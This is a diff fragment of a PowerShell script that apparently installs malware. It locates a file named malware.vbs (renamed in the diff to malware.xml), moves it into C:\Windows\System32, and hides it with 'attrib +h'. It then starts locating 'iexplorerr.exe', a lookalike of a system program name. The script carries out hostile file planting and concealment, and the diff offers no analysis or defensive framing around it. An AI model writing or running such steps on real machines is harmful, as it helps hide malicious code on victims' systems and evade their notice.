@@ -2,12 +2,12 @@
 
 # set PWD to C:
 
-# Find malware.vbs 
-$malvbsLoc = Get-ChildItem malware.vbs
-# Move malware.vbs
+# Find malware.xml 
+$malvbsLoc = Get-ChildItem malware.xml
+# Move malware.xml
 move $malvbsLoc C:\Windows\System32
 # Hide the file from windows explorer using attrib 
-attrib +h C:\Windows\System32\malware.vbs
+attrib +h C:\Windows\System32\malware.xml
 
 # Find iexplorerr.exe
 $iexplorerrLoc = Get-ChildItem iexplorerr.exe
